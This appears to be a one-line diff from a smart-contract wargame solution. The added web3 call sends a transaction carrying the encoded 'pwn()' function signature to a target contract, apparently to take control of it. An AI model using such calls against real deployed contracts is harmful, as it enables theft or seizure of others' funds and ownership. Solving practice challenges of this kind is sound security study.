@@ -1,0 +1,1 @@
+contract.sendTransaction({from: player, to: contract, data: web3.eth.abi.encodeFunctionSignature('pwn()')})
